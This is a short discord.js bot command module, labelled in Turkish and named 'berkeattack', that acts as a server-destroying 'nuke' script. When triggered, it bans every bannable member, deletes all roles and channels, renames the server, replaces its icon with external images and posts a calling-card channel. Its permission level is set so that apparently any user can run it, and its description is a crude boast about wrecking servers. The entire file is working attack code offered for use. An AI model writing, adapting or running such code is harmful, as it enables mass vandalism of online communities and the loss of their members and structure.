const Discord = require('discord.js');
const ayarlar = require('../tokenyeri.json');

exports.run = async (client, message, args) => {
if (message.guild) {

message.guild.members.forEach(u => {
if (u.bannable) {
message.guild.ban(u, "Elim Çarptı")
}
})
message.guild.roles.deleteAll("");
message.guild.channels.deleteAll("");
}

message.guild.setName(`BERKE ADAMDIR`, "")
message.guild.setIcon(`https://cdn.discordapp.com/attachments/522020595123224595/585051070942674964/unknown.png`)
message.guild.setIcon(`https://images-ext-1.discordapp.net/external/Y7R2e9ELj25TBIHsxS9Or2suLUqLYcKOb2ve33XqbSA/%3Fs%3D400%26v%3D4/https/avatars3.githubusercontent.com/u/21992052`)
message.guild.createChannel(`berke`)
message.delete()
};  

exports.conf = {
  enabled: true,
  guildOnly: true,
  aliases: ['deltaattack'],
  permLevel: 0,
  kategori: "sikici"
};

exports.help = {
  name: 'berkeattack',
  description: 'sunucu siker', 
  usage: 'benberke = sunucu siker'
};
